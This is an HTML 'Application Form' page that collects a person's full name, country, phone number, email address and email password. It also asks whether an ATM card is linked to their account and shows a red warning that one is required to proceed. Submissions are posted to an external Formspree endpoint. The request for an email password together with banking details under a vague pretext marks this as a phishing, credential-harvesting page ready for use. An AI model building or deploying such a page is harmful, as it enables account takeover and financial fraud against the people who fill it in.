<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Application Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f2f2f2;
      padding: 20px;
    }
    form {
      max-width: 500px;
      margin: auto;
      background: #fff;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    label {
      display: block;
      margin-bottom: 5px;
      font-weight: bold;
    }
    input[type="text"],
    input[type="tel"],
    input[type="password"],
    input[type="email"],
    select {
      width: 100%;
      padding: 8px;
      margin-bottom: 15px;
      border-radius: 5px;
      border: 1px solid #ccc;
    }
    .error {
      color: red;
      font-size: 0.9em;
      display: none;
    }
    .atm-warning {
      color: red;
      font-weight: bold;
      display: none;
      margin-top: -10px;
      margin-bottom: 10px;
    }
    button {
      background: #007bff;
      color: #fff;
      padding: 10px 15px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
    .password-wrapper {
      position: relative;
    }
    .toggle-password {
      position: absolute;
      top: 50%;
      right: 10px;
      transform: translateY(-50%);
      cursor: pointer;
      font-size: 0.9em;
      color: #555;
    }
  </style>
</head>
<body>
  <form id="applicationForm" action="https://formspree.io/f/yourFormID" method="POST" onsubmit="return validateForm()">
    <h2>Application Form</h2>

    <label for="fullName">Full Name:</label>
    <input type="text" id="fullName" name="Full Name" required />
    <div class="error" id="nameError">Full Name is required</div>

    <label for="country">Country:</label>
    <input type="text" id="country" name="Country" required />
    <div class="error" id="countryError">Country is required</div>

    <label for="phone">Phone Number:</label>
    <input type="tel" id="phone" name="Phone Number" pattern="[0-9]{9,12}" required />
    <div class="error" id="phoneError">Phone must be 9 to 12 digits</div>

    <label for="email">Email:</label>
    <input type="email" id="email" name="Email" required />
    <div class="error" id="emailError">Valid Email is required</div>

    <label for="password">Email Password:</label>
    <div class="password-wrapper">
      <input type="password" id="password" name="Email Password" required />
      <span class="toggle-password" onclick="togglePassword()">üëÅÔ∏è</span>
    </div>
    <div class="error" id="passwordError">Password is required</div>

    <label for="atm">Did you link ATM card to your account?</label>
    <select id="atm" name="Linked ATM Card" onchange="checkATM()" required>
      <option value="">--Select an option--</option>
      <option value="Yes">Yes</option>
      <option value="No">No</option>
    </select>
    <div class="atm-warning" id="atmWarning">YOU MUST HAVE ATM CARD TO PROCEED</div>

    <button type="submit">Submit</button>
  </form>

  <script>
    function togglePassword() {
      const pass = document.getElementById('password');
      pass.type = pass.type === 'password' ? 'text' : 'password';
    }

    function checkATM() {
      const atm = document.getElementById("atm").value;
      const warning = document.getElementById("atmWarning");
      if (atm === "No") {
        warning.style.display = "block";
      } else {
        warning.style.display = "none";
      }
    }

    function validateForm() {
      let valid = true;

      const fullName = document.getElementById("fullName");
      const phone = document.getElementById("phone");
      const country = document.getElementById("country");
      const email = document.getElementById("email");
      const password = document.getElementById("password");

      // Name
      if (fullName.value.trim() === "") {
        document.getElementById("nameError").style.display = "block";
        valid = false;
      } else {
        document.getElementById("nameError").style.display = "none";
      }

      // Country
      if (country.value.trim() === "") {
        document.getElementById("countryError").style.display = "block";
        valid = false;
      } else {
        document.getElementById("countryError").style.display = "none";
      }

      // Phone
      if (!phone.value.match(/^\d{9,12}$/)) {
        document.getElementById("phoneError").style.display = "block";
        valid = false;
      } else {
        document.getElementById("phoneError").style.display = "none";
      }

      // Email
      if (email.value.trim() === "") {
        document.getElementById("emailError").style.display = "block";
        valid = false;
      } else {
        document.getElementById("emailError").style.display = "none";
      }

      // Password
      if (password.value.trim() === "") {
        document.getElementById("passwordError").style.display = "block";
        valid = false;
      } else {
        document.getElementById("passwordError").style.display = "none";
      }

      return valid;
    }

    // Show validation immediately on blur
    document.querySelectorAll("input, select").forEach(field => {
      field.addEventListener("blur", validateForm);
    });
  </script>
</body>
</html>
